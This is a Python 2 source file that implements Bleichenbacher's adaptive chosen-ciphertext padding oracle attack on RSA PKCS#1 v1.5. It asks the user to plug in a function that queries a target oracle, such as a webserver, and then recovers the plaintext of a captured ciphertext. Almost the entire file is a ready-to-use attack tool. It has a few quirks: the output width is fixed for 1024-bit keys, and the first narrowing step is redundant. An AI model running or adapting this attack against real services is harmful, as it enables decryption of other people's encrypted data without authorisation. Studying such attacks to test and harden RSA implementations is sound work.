#!/usr/bin/env python2

from __future__ import absolute_import

import rsa
import binascii

class PaddingOracleAttack:
    r'''Implemented as described in:
    http://secgroup.dais.unive.it/wp-content/uploads/2012/11/Practical-Padding-Oracle-Attacks-on-RSA.html

    Starts a Padding oracle attack and using the padding_oracle
    function provided retrieves the plaintext behind the ciphertext y0.
    Arguments:
        k(int): the size of the RSA key in bits used to encrypt y0 (e.g. 1024 bit RSA key)
        n(int): the modulus n
        b(int): the public exponent of the RSA key
        padding_oracle(function): the function you wrote to communicate with the oracle
    
    The function must return a boolean value of True or False after it communicated with
    the oracle. The oracle could be a webserver, a local program etc. The only input parameter
    of the function must be a string which will be generated with the Bleichenbacher attack 
    and will help to restrict the interval of candidate plaintexts. Eventually the plaintext
    will be retrieved and returned.
    '''

    def __init__(self, k, n, b, y0, padding_oracle):
        self.padding_oracle = padding_oracle 
        self.k = k #size RSA key in bits
        self.n = n #the modulus n
        self.y0 = y0 #ciphertext to decrypt
        self.b = b #public exponent
        self.B = 2**(self.k-16)  
        self.B2,self.B3 = 2*self.B,3*self.B #constants to avoid recomputation

    def _ceil(self, x,y):
        return x/y + (x%y != 0)

    def _floor(self, x,y):
        return x//y

    '''Converts binary data into a long for the attack'''
    def _bin2long(self, bin_data):
        return long(binascii.hexlify(bin_data),16)

    '''encrypts an integer number using the rsa library'''
    def _encrypt_int(self, plaintext):
        return rsa.core.encrypt_int(plaintext, self.b, self.n)
             
    '''
    Given a starting value, finds and s1 that multiplied by the encrypted message mod n gives a correctly
    padded message. Uses the RSA multiplicative property and a padding oracle.
    '''
    def _search_s1(self, start_value, y0):
        s1=start_value #starting value of s1
        while True:
            y1 = (self._encrypt_int(s1) * y0) % self.n
            if(self.padding_oracle(y1)):
                break
            s1 += 1 #try next value of s1
        return s1

    ''' 
    Calculates the first set of intervals given s1
    '''
    def _calculate_intervals(self, s1):
        newM = set([]) #collects new intervals
        for r in range(self._ceil((self.B2*s1-self.B3+1),self.n), self._floor(((self.B3-1)*s1 - self.B2),self.n)+1):
            aa = self._ceil((self.B2+r*self.n),s1)
            bb = self._floor((self.B3-1+r*self.n),s1)
            newa = max(self.B2,aa)
            newb = min(self.B3-1,bb)
            if newa <= newb:
                newM |= set([(newa,newb)])
        return newM

    '''
    Narrows down the interval set M and thus reduces the possible candidates for the plaintext
    '''
    def _narrow_intervals(self, si, M):
        newM = set([]) #collects new intervals
        for (a,b) in M: #for all intervals
            for r in range(self._ceil((a*si-self.B3+1),self.n), self._floor((b*si - self.B2),self.n)+1):
                aa = self._ceil((self.B2 + r*self.n),si)
                bb = self._floor((self.B3-1 + r*self.n),si)
                newa = max(a,aa)
                newb = min(b,bb)
                if newa <= newb:
                    newM |= set([(newa,newb)])
        return newM

    '''
    Binary search of s1 with just one residual interval [a,b]
    '''
    def _just_one_interval(self, si,a,b):
        r = self._ceil((b*si - self.B2)*2, self.n) # starting value for r
        found = False
        while not found:
            for si in range(self._ceil((self.B2 + r * self.n),b),self._floor((self.B3-1 + r * self.n),a)+1):
                yi = (self._encrypt_int(si) * self.y0) % self.n
                if self.padding_oracle(yi):
                    found = True
                    break # we found si
            if not found:
                r  += 1   # try next value for r
        return si     

    '''
    Runs the attack and returns the decrypted message
    '''
    def run_attack(self):
        self.y0 = self._bin2long(self.y0)
        s1_start_value=self._ceil(self.n,self.B3)
        s1 = self._search_s1(s1_start_value,self.y0)
        newM=self._calculate_intervals(s1)
        while len(newM) > 1:
            newM=self._narrow_intervals(s1,newM)
            s1=self._search_s1(s1+1,self.y0)    
        elem = newM.pop()
        newM.add(elem)
        while True: 
            s1=self._just_one_interval(s1,elem[0],elem[1])
            newM=self._narrow_intervals(s1,newM)
            elem = newM.pop()
            newM.add(elem)
            if(elem[0] == elem[1]): #The interval is narrowed to one element
               return '%0256x' % elem[0] 
